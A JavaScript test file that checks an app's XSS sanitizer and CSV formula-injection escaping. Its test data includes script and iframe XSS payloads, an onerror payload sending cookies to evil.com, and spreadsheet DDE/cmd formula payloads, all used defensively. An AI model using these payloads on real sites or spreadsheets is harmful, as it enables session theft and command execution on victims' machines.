import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { sanitizeHtml, sanitizeText, sanitizeObjectStrings } from "../utils/xssSanitizer.js";
import { sanitizeCsvCell, generateCsv } from "../utils/csvSanitizer.js";

describe("CAMX-019 & CAMX-022: XSS and CSV Formula Injection Sanitization", () => {
  test("CAMX-019: XSS Sanitizer strips malicious <script> and iframe tags", () => {
    const maliciousHtml = `<p>Nice camera!</p><script>alert('XSS')</script><iframe src="javascript:alert(1)"></iframe>`;
    const sanitized = sanitizeHtml(maliciousHtml);

    assert.ok(!sanitized.includes("<script>"));
    assert.ok(!sanitized.includes("<iframe>"));
    assert.ok(!sanitized.includes("alert('XSS')"));
    assert.ok(sanitized.includes("<p>Nice camera!</p>"));
  });

  test("CAMX-019: XSS Sanitizer strips event handlers like onerror and onload", () => {
    const maliciousPayload = `<img src="invalid.jpg" onerror="fetch('http://evil.com?c='+document.cookie)" />`;
    const sanitized = sanitizeHtml(maliciousPayload);

    assert.ok(!sanitized.includes("onerror"));
    assert.ok(!sanitized.includes("evil.com"));
  });

  test("CAMX-019: sanitizeText strips all HTML tags completely", () => {
    const textWithTags = `<b>Wireless</b> <script>alert(1)</script> Security <i>Cam</i>`;
    const cleanText = sanitizeText(textWithTags);

    assert.equal(cleanText, "Wireless  alert(1)  Security Cam".replace(/\s+/g, " ").trim());
    assert.ok(!cleanText.includes("<b>"));
    assert.ok(!cleanText.includes("<script>"));
  });

  test("CAMX-019: sanitizeObjectStrings cleans nested objects and arrays", () => {
    const specs = {
      resolution: "4K <script>bad()</script>",
      features: ["Night Vision", "<img src=x onerror=bad()>"],
    };
    const sanitized = sanitizeObjectStrings(specs);

    assert.ok(!sanitized.resolution.includes("<script>"));
    assert.ok(!sanitized.features[1].includes("onerror"));
  });

  test("CAMX-022: CSV Sanitizer neutralizes spreadsheet formula injection (=, +, -, @)", () => {
    const formulaPayloads = ["=cmd|' /C calc'!A0", "+2+5+cmd|' /C calc'!A0", "-2+3+cmd|' /C calc'!A0", "@SUM(1+1)*cmd|' /C calc'!A0", '\tDDE("cmd";"/C calc";"__DdeLink__")'];

    for (const payload of formulaPayloads) {
      const sanitizedCell = sanitizeCsvCell(payload);
      // Ensure the cell starts with a quote and a single quote escape
      assert.ok(sanitizedCell.startsWith("\"'"), `Failed for formula payload: ${payload}`);
    }
  });

  test("CAMX-022: CSV Generator properly escapes quotes and delimiters", () => {
    const headers = ["ID", "Name", "Total"];
    const rows = [
      ["ORD-1", 'Camera "Pro" Model, 4K', 15000],
      ["ORD-2", "=SUM(A1:A10)", 25000],
    ];

    const csvOutput = generateCsv(headers, rows);
    assert.ok(csvOutput.includes('"Camera ""Pro"" Model, 4K"'));
    assert.ok(csvOutput.includes('"\'=SUM(A1:A10)"'));
  });
});
